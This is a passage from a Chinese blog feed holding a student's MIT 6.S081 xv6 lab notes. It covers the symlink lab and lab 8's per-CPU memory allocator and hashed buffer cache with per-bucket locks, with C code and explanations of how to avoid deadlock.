在open它的时候，它会直接导向target</p></li><li><p>创建软链接，分为以下几步</p><ol><li>首先创建一个文件，即获得一个inode，这个可以通过create函数实现</li><li>将我们的target写入这个inode，我们就将target存在第一个文件数据块就行了</li></ol></li><li><p>打开软链接对应的文件，分为以下几步</p><ol><li>在open中获取软链接对应的真实的inode</li><li>然后就让open对这个inode进行分配fd和file的操作即可</li></ol></li></ol><p>代码很少，但是思路真的很有意思</p><h3 id="sys-symlink"><a href="#sys-symlink" class="headerlink" title="sys_symlink"></a>sys_symlink</h3><p>这里可以先看看create和open的代码是如何使用xv6提供的一些api的，主要是</p><p><code>create</code>,<code>writei</code>,<code>readi</code></p><ol><li>首先，我们需要将target和path这两个参数从寄存器中读出来，使用argstr即可</li><li>然后，我们需要创建inode，使用create函数，第一个参数是软链接的路径，第二个参数是文件类型，我们这里当然是新建的那个，后面两个参数不知道啥意思，模仿其他函数的使用，填0</li><li>将target写入软链接文件，也就是写入数据块，使用writei函数<ol><li>第一个参数是inode的指针</li><li>第三个参数是我们写入的东西的地址，这里就是target的地址</li><li>第四个参数是写到文件的哪里，其实就是使用一个偏移量完成，我们软链接文件没其他的文件内容，就写到偏移量为0的地方，也就是文件的起始位置</li><li>最后一个参数是写入多少个字节</li><li>注意，这里如果操作失败了，需要将这个inode的锁给解开了</li></ol></li></ol><blockquote><p>bug：没有正确判断函数的返回值，说的就是writei，主要是因为writei的参数太多了，当我一个一个填完参数之后，就忘记判断它的返回值是否小于0了</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c">sys_symlink(<span class="hljs-type">void</span>) &#123;<br>    <span class="hljs-type">char</span> target[MAXPATH], path[MAXPATH];<br>    <span class="hljs-keyword">if</span> (argstr(<span class="hljs-number">0</span>, target, MAXPATH) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (argstr(<span class="hljs-number">1</span>, path, MAXPATH) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">ip</span>;</span><br>    <span class="hljs-comment">// 创建软链接文件的inode</span><br>    begin_op();<br>    <span class="hljs-keyword">if</span> ((ip = create(path, T_SYMLINK, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) == <span class="hljs-number">0</span>) &#123;<br>        end_op();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-comment">// 将target写入软链接的数据块中</span><br>    <span class="hljs-keyword">if</span> (writei(ip, <span class="hljs-number">0</span>, (uint64)target, <span class="hljs-number">0</span>, <span class="hljs-built_in">strlen</span>(target)) &lt; <span class="hljs-number">0</span>) &#123;<br>        iunlockput(ip);<br>        end_op();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    iunlockput(ip);<br>    end_op();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里还有一些细节，比如<code>begin_op</code>和<code>end_op</code>，比如<code>create</code>之后是会自动给<code>inode</code>上锁的</p><h3 id="sys-open"><a href="#sys-open" class="headerlink" title="sys_open"></a>sys_open</h3><p>这一个函数的修改就是对应我们真正使用软链接的情况</p><p>如果我们设置了O_NOFOLLOW，那说明不是访问target，就是想访问这个软链接，那就正常open就行了</p><p>而如果我们没设置，说明实际上要访问的是target，在这种情况下，我们只需要在open函数分配fd和file之前，将ip指针切换成target的ip地址即可，因此，找一个适当的位置截胡即可。我这里选择的是在获取已有文件的inode时进行的</p><ol><li>首先，如果进入了else分支，都进入这个while循环，这个while循环走来就读取path的inode，如果不是软链接或者不是需要target的情况，那就直接break，这样的话就和之前的open一样了</li><li>如果需要找target，那就会读出当前软链接文件的target，然后解锁当前inode，进入下一轮while循环，获取target的inode，如果还是软链接，则递归操作，这里是通过迭代代替递归<ol><li>这中间关键的函数是readi函数，我看了下实现，具体的操作其实看不太懂。这里有个小问题，那就是最后一个参数应该传入的是我们想读入的path的长度，但是我们这里不知道path多长，只能传入MAXPATH。这样有没有可能多读了呢？我估计是因为这些数据块的没有被write的地方都是0，那么多读一点正好还给path当结尾0了</li></ol></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (omode &amp; O_CREATE) &#123;<br>    ip = create(path, T_FILE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (ip == <span class="hljs-number">0</span>) &#123;<br>        end_op();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-type">int</span> depth = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">if</span> ((ip = namei(path)) == <span class="hljs-number">0</span>) &#123;<br>            end_op();<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>        ilock(ip);<br>        <span class="hljs-keyword">if</span> ((ip-&gt;type == T_SYMLINK) &amp;&amp; (!(omode &amp; O_NOFOLLOW))) &#123;<br>            <span class="hljs-keyword">if</span> (++depth &gt; <span class="hljs-number">10</span>) &#123;<br>                iunlockput(ip);<br>                end_op();<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (readi(ip, <span class="hljs-number">0</span>, (uint64)path, <span class="hljs-number">0</span>, MAXPATH) &lt; <span class="hljs-number">0</span>) &#123;<br>                iunlockput(ip);<br>                end_op();<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>            iunlockput(ip);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (ip-&gt;type == T_DIR &amp;&amp; omode != O_RDONLY) &#123;<br>        iunlockput(ip);<br>        end_op();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个lab说简单也简单，说难也难，<del>主要是我人菜还不愿意慢慢学</del></p>]]></content>
    
    
    <categories>
      
      <category>Operating System</category>
      
      <category>MIT6.S081</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Operating System</tag>
      
      <tag>MIT6.S081</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>6.s081_lab8</title>
    <link href="/2023/08/27/6-s081-lab8/"/>
    <url>/2023/08/27/6-s081-lab8/</url>
    
    <content type="html"><![CDATA[<p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224204632.png" alt="20231224204632"></p><h1 id="PreRead"><a href="#PreRead" class="headerlink" title="PreRead"></a>PreRead</h1><ol><li>第六章</li><li>3.5节：物理内存分配器</li><li>8.1-8.3</li></ol><blockquote><p>这次的lab，本质上都是通过将锁的粒度减小来获得性能的提升</p><ol><li>第一个task，可以简单地按cpu划分，因为本来就是空闲页面，谁拥有都一样</li><li>第二个task，本质上也可以简单地按某种性质划分，但是因为我们不只需要分配，我们 还需要查找。如果随便分成若干部分，那么查找起来就非常慢了。所以这也是为什么hints里提示我们用哈希表来划分</li></ol></blockquote><h1 id="Memory-allocator"><a href="#Memory-allocator" class="headerlink" title="Memory allocator"></a>Memory allocator</h1><h2 id="tasks"><a href="#tasks" class="headerlink" title="tasks"></a>tasks</h2><ol><li><p>你的任务是去实现per-cpu空闲链表，并且在一个cpu的空闲链表空着的时候去偷另一个cpu的空闲链表</p></li><li><p>你的所有锁的名字都应该以<code>kmem</code>开头，即在<code>initlock</code>中设置</p></li><li><p>你必须通过</p><p> <code>kalloctest</code>，make grade会提醒你它通过了</p><p> <code>usertests</code>，可以先检查一下<code>sbrkmuch</code></p></li></ol><h2 id="hints"><a href="#hints" class="headerlink" title="hints"></a>hints</h2><ol><li><p>你可以使用<code>kernel/param.h</code>中的<code>NCPU</code>常数</p></li><li><p>让<code>freerange</code>将所有的空闲内存都给正在运行的free range</p></li><li><p><code>cpuid</code>函数会返回当前的cpu号，但是它必须在中断被关闭的时候使用</p><p> 因此你需要使用<code>push_off</code>和<code>pop_off</code></p></li><li><p>看一下<code>snprintf</code>，学习怎么格式化字符</p></li></ol><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先，我们需要以不同的cpu号去访问不同的freelist，最方便的方法就是用一个数组，如下所示。其中count是为了借空闲页面准备的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">lock</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">run</span> *<span class="hljs-title">freelist</span>;</span><br>    <span class="hljs-type">int</span> count;<br>&#125; kmem[NCPU];<br></code></pre></td></tr></table></figure><p>然后，我们应该在kinit中先初始化各种cpu对应的lock，然后将所有空闲页面都放到运行kinit的cpu上。</p><p>这里有几个细节</p><ol><li>首先，我是希望kinit只被一个cpu执行，这样才能保证freerange将所有页面都放到这个cpu上，因此，我需要使用<code>push_off</code>和<code>pop_off</code>将kinit包围起来</li><li>对于<code>b_lock</code>这个锁，也是为了借空闲页面准备的，否则可能发生死锁</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">kinit</span><span class="hljs-params">()</span> &#123;<br>    push_off();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NCPU; i++) &#123;<br>        initlock(&amp;kmem[i].lock, <span class="hljs-string">&quot;kmem&quot;</span>);<br>        kmem[i].count = <span class="hljs-number">0</span>;<br>    &#125;<br>    initlock(&amp;b_lock, <span class="hljs-string">&quot;borrow&quot;</span>);<br><br>    freerange(end, (<span class="hljs-type">void</span> *)PHYSTOP);<br>    pop_off();<br>&#125;<br></code></pre></td></tr></table></figure><p>freerange函数不需要修改</p><p>在kfree函数中，当我们准备将这个空闲页面加入到一个freelist时，先关闭中断，然后获取当前cpu号，加入到对应的freelist，还是比较简单的。</p><p>其中，如果是freerange调用的kfree，可能会有<code>push_off</code>的嵌套，不过这没关系，只要<code>pop_off</code>成对出现即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">kfree</span><span class="hljs-params">(<span class="hljs-type">void</span> *pa)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">run</span> *<span class="hljs-title">r</span>;</span><br>    <span class="hljs-keyword">if</span> (((uint64)pa % PGSIZE) != <span class="hljs-number">0</span> || (<span class="hljs-type">char</span> *)pa &lt; end || (uint64)pa &gt;= PHYSTOP)<br>        panic(<span class="hljs-string">&quot;kfree&quot;</span>);<br>    <span class="hljs-comment">// Fill with junk to catch dangling refs.</span><br>    <span class="hljs-built_in">memset</span>(pa, <span class="hljs-number">1</span>, PGSIZE);<br>    r = (<span class="hljs-keyword">struct</span> run *)pa;<br><br>    push_off();<br><br>    <span class="hljs-type">int</span> id = cpuid();<br>    acquire(&amp;kmem[id].lock);<br>    r-&gt;next = kmem[id].freelist;<br>    kmem[id].freelist = r;<br>    kmem[id].count++;<br>    release(&amp;kmem[id].lock);<br><br>    pop_off();<br>&#125;<br></code></pre></td></tr></table></figure><p>kalloc函数，如果当前cpu有空闲页面，则正常操作，否则的话，需要去借页面。我这里采用的借的策略是遍历所有cpu，如果某个cpu有空闲页面，那我就借一半，如果有3个，那我就借2个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Allocate one 4096-byte page of physical memory.</span><br><span class="hljs-comment">// Returns a pointer that the kernel can use.</span><br><span class="hljs-comment">// Returns 0 if the memory cannot be allocated.</span><br><span class="hljs-type">void</span> *<br><span class="hljs-title function_">kalloc</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">run</span> *<span class="hljs-title">r</span>;</span><br><br>    push_off();<br>    <span class="hljs-type">int</span> id = cpuid();<br>    acquire(&amp;kmem[id].lock);<br>    r = kmem[id].freelist;<br>    <span class="hljs-keyword">if</span> (r) &#123;<br>        kmem[id].freelist = r-&gt;next;<br>        kmem[id].count--;<br>    &#125;<br>    release(&amp;kmem[id].lock);<br>    <span class="hljs-keyword">if</span> (!r) &#123;<br>        acquire(&amp;b_lock);<br>        r = borrow(id);<br>        release(&amp;b_lock);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (r)<br>        <span class="hljs-built_in">memset</span>((<span class="hljs-type">char</span> *)r, <span class="hljs-number">5</span>, PGSIZE); <span class="hljs-comment">// fill with junk</span><br>    pop_off();<br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *)r;<br>&#125;<br></code></pre></td></tr></table></figure><p>具体的borrow函数的实现如下</p><p>可以发现，在进入borrow函数之前，我就将当前cpu的freelist的锁给释放了。这是因为我进入borrow之后，会去获取其他freelist的锁，假如我是cpu a，我在borrow里要获取cpu b的锁。而b此时也在运行borrow，那它可能也在获取我的锁。如果我和b在进入borrow前都没有释放自己的锁，那必然就死锁了</p><p>另外，为什么在borrow之前要获得一个borrow的大锁呢？这是因为如果我在borrow里如果找到了一个可以借的freelist，那么我还是会获取两个锁，这也是有可能造成问题的，因为我们没有限制获取锁的顺序。为了避免可能的情况，我是用这个大锁来保平安，不过好像不会出现这种情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">borrow</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NCPU; i++) &#123;<br>        acquire(&amp;kmem[i].lock);<br>        <span class="hljs-keyword">if</span> (kmem[i].count != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">int</span> b_count = (kmem[i].count + <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>;<br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">run</span> *<span class="hljs-title">r</span> =</span> kmem[i].freelist;<br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">run</span> *<span class="hljs-title">temp</span> =</span> r;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; b_count - <span class="hljs-number">1</span>; i++) &#123;<br>                temp = temp-&gt;next;<br>            &#125;<br>            kmem[i].freelist = temp-&gt;next;<br>            kmem[i].count -= b_count;<br>            acquire(&amp;kmem[id].lock);<br>            <span class="hljs-keyword">if</span> (b_count != <span class="hljs-number">1</span>) &#123;<br>                temp-&gt;next = kmem[id].freelist;<br>                kmem[id].freelist = r-&gt;next;<br>                kmem[id].count += b_count - <span class="hljs-number">1</span>;<br>            &#125;<br>            release(&amp;kmem[id].lock);<br>            release(&amp;kmem[i].lock);<br>            <span class="hljs-keyword">return</span> r;<br>        &#125;<br>        release(&amp;kmem[i].lock);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/6a825b335761dd206d84b83e2906b6e0.png" alt="image-20230827120002931"></p><h1 id="Buffer-cache"><a href="#Buffer-cache" class="headerlink" title="Buffer cache"></a>Buffer cache</h1><h2 id="task"><a href="#task" class="headerlink" title="task"></a>task</h2><ol><li>修改<code>bget</code>和<code>brelse</code>，使得对磁盘块的查找和释放在lock上等待的时间越少越好</li><li>通过<code>bcachetest</code>和<code>usertests</code></li><li>请给你的所有lock一个以bcache开头的名字，在initlock中实现它</li><li>这玩意比kalloc要难太多，因为buffer是必须被所有cpu共享的，不能每个cpu一份，因此建议使用一个哈希表，给哈希表的每个桶都设置一个锁</li><li>以下情况发生冲突是没关系的，因为测试不会有这些情况<ol><li>两个进程访问同一个磁盘block</li><li>两个进程同时miss然后需要找到一个没用过的block</li><li>两个进程同时操作block，但是它们恰好在你的hash策略中碰撞了，那么你应该避免这种情况，比如调大你的哈希表的size</li></ol></li></ol><h2 id="hints-1"><a href="#hints-1" class="headerlink" title="hints"></a>hints</h2><ol><li>阅读xv6的8.1到8.3</li><li>你可以使用固定长度的哈希表，同时选择一个质数去做哈希，比如13</li><li>在哈希表中查找一个buffer和为这个buffer分配一个entry必须是原子性的</li><li>删除所有缓存的链表（bcache.head），时间戳缓存使用它们上一次使用的时间（trap.c中的ticks）。有了这个改变之后，brelse不需要获得bcache的lock，bget可以基于时间戳选择最近最少使用的块</li><li>在bget中使用顺序查找实现LRU是可以的</li><li>你有时可能需要持有两个锁，即bcache锁和每个bucket的锁，保证你可以避免死锁</li><li>当你替换某一块的内容时，需要将buf从一个bucket移到另一个，记得处理这两个bucket相同的情况，否则就死锁了</li></ol><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>hints里其实就提供了一个思路，用哈希表去存可用的buf。但是到底怎么实现呢？我觉得这里的思路应该有很多，这里提供一种。</p><ol><li>首先，我们通过<code>blockno % prime</code>为key，构造一个哈希表，其中prime可以取hints里的13<ol><li>每一个哈希表的表槽都是一个buf链表+一个表槽锁</li><li>这个链表的结构可以按照原来的bcache里那个head来</li><li>表槽锁就是保护这个表槽里的这个链表</li></ol></li><li>然后，我们在<code>binit</code>中先将所有的空闲buf都放到key&#x3D;0的链表中，其实放到哪都可以，平均放到每个表槽也行</li><li>在<code>bget</code>的时候，先根据blockno计算出key，然后去对应的表槽里找是否这个block已经被取出来了<ol><li>如果已经取出来了，则直接返回buf指针，这一个逻辑和原来的bget很像</li><li>如果这个block还没有被取出来，那么我们就去找一个引用数为0的buf，将这个buf的内容换成我们这个block。这里又有两种情况，因此我们需要遍历整个哈希表的表槽，并遍历每个表槽的链表，在链表上执行lru算法，找到一个buf，将这个buf修改为我们的内容，然后移动到key对应的表槽<ol><li>这个引用数为0的buf在我们这个表槽的链表里</li><li>这个引用数为0的buf在别的表槽里</li></ol></li></ol></li><li>在<code>brelse</code>中，就很简单，只需要将refcnt减1就行了，都不用将这个buf移动</li></ol><p>思路就是这样，不过有一个关键点没有涉及，那就是锁，该如何安排锁呢？</p><p>首先，锁肯定是要去保护一些东西的，之前的bcache的那个大锁，是因为保护的东西太多了，所有buf都是被它保护着，这就导致很慢了，因为可能不同的cpu没有冲突，但依然要等很久。</p><p>因此，我们这里采用一种哈希表的方法，使得锁管理的范围变小。对于某个key对应的表槽的那个锁，它只需要管理<code>blockno%prime==key</code>的block，也就是说，我们将原来的一个锁，变成了prime个锁，使得它们管理的范围缩小了prime倍。当然了，这是对于那些存储了某些block的内容的buf而言的，如果它存储了，那么它肯定就在对应的表槽中。至于那些没有存储的，或者说引用数为0的，我们可以称为空闲buf，它们按什么方式组织都行，甚至可以专门搞一个空闲链表都可以。但是这里采用的方式比较偷懒，也比较巧，即没有存储的一开始就放在key&#x3D;0的表槽链表，引用计数为0的，直接不处理，反正它们都可能在<code>bget</code>中被访问到</p><p>最后，锁的作用呢？我们这里有两个锁，一个锁是表槽对应的锁，一个是每个buf对应的锁，它们分别保护了什么？</p><ol><li>表槽锁当然是保护了表槽里的那个链表，也就是保护了链表的每个节点，即一个个buf，使得链表或者每个buf在被修改时，只会有一个线程对它们进行修改</li><li>而每个buf对应的锁，它的作用是使得，在某一刻，它永远只会被一个线程所拥有，不会同时被多个线程拥有。所以这个锁使用起来非常简单，我们只需要在我们找到了一个正确的buf，将它作为res在<code>bget</code>中返回之前调用这个buf的锁即可</li></ol><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>首先是整体的布局</p><ol><li>这里的<code>bcache</code>最好不删，因为这个变量默认就开辟了<code>NBUF</code>个<code>struct buf</code>，省的我们自己申请空间创造了</li><li>哈希表有prime个表槽，每个表槽一个链表+一个锁，链表的结构和之前的一样，一个head作为dummynode，方便操作</li><li>一些宏，主要是方便，省的后面输入一大串代码来获取锁和释放锁</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> prime 13</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> <span class="hljs-title">buf</span>[<span class="hljs-title">NBUF</span>];</span><br>&#125; bcache;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">lock</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> <span class="hljs-title">head</span>;</span><br>&#125; ht[prime];<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LOCK(i) (acquire(&amp;ht[i].lock));</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UNLOCK(i) (release(&amp;ht[i].lock));</span><br></code></pre></td></tr></table></figure><p>binit函数</p><ol><li>首先给每个表槽的锁给初始化，然后初始化这个head</li><li>将所有的buf都放到key&#x3D;0的表槽中</li></ol><p>这个过程很像之前binit，抄就完事了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">binit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> *<span class="hljs-title">b</span>;</span><br><br>    <span class="hljs-type">char</span> a[<span class="hljs-number">20</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; prime; i++) &#123;<br>        <span class="hljs-built_in">snprintf</span>(a, <span class="hljs-keyword">sizeof</span>(a), <span class="hljs-string">&quot;bcache_%d&quot;</span>, i);<br>        initlock(&amp;ht[i].lock, a);<br>        ht[i].head.prev = &amp;ht[i].head;<br>        ht[i].head.next = &amp;ht[i].head;<br>    &#125;<br><br>    <span class="hljs-comment">// Create linked list of buffers</span><br>    <span class="hljs-keyword">for</span> (b = bcache.buf; b &lt; bcache.buf + NBUF; b++) &#123;<br>        initsleeplock(&amp;b-&gt;lock, <span class="hljs-string">&quot;buffer&quot;</span>);<br>        insert_into_ht(b, <span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现，这里用到了一个<code>insert_into_ht</code>的操作，定义如下</p><ol><li>可以从原来的<code>brelse</code>抄</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">insert_into_ht</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> buf *b, <span class="hljs-type">int</span> key)</span> &#123;<br>    b-&gt;next = ht[key].head.next;<br>    b-&gt;prev = &amp;ht[key].head;<br>    ht[key].head.next-&gt;prev = b;<br>    ht[key].head.next = b;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete_from_ht</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> buf *b)</span> &#123;<br>    b-&gt;next-&gt;prev = b-&gt;prev;<br>    b-&gt;prev-&gt;next = b-&gt;next;<br>&#125;<br></code></pre></td></tr></table></figure><p>brelse函数的实现也非常简单</p><ol><li>释放这个buf的锁，其实这个释放放在哪一行都没问题<ol><li>因为它的refcnt还没减1，就注定了它不会被别人给夺舍</li><li>只要unlock不取消掉，就没有人能够访问到它</li></ol></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">brelse</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> buf *b)</span> &#123;<br>    releasesleep(&amp;b-&gt;lock);<br>    <span class="hljs-type">int</span> key = b-&gt;blockno % prime;<br>    LOCK(key);<br>    b-&gt;refcnt -= <span class="hljs-number">1</span>;<br>    UNLOCK(key);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>bpin</code>和<code>bunpin</code>的实现也很简单</p><ol><li>首先，这两个函数肯定是在一个buf已经有了一个block，并且refcnt不为0的情况下调用的</li><li>我们只需要先获得对应表槽的锁，即获得对这个buf的修改权，然后修改，就可以了</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 